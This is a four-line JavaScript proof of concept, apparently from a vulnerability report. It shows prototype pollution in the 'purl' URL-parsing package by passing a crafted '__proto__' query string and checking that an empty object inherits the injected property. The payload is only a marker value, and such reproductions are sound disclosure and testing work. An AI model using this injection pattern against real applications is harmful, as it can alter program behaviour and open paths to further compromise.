const purl = require("purl");

purl('http://test/?__proto__["polluted"]="yes"');

console.log({}.polluted);
